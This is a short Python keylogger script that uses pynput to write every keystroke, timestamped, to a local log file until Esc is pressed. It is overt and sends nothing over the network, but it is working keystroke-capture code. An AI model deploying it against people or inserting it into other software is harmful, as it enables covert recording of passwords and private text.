from pynput import keyboard
from datetime import datetime
import os

# Directory and file setup for log storage
LOG_DIR = "keylogs"
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "log.txt")

# Function to log key with timestamp
def log_key(key):
    with open(LOG_FILE, "a") as log_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Determine if the key is printable or a special key
        try:
            key_data = key.char  # Printable key
        except AttributeError:
            key_data = str(key)  # Special key like 'space' or 'enter'
        
        # Write the formatted log entry
        log_file.write(f"[{timestamp}] {key_data}\n")

# Function to handle key press events
def on_press(key):
    log_key(key)
    
    # Optional: Add exit condition
    if key == keyboard.Key.esc:  # Stop logging on 'Esc' key press
        print("Logging stopped.")
        return False  # Stops the listener

# Start the key listener
print("Logging started... Press 'Esc' to stop.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
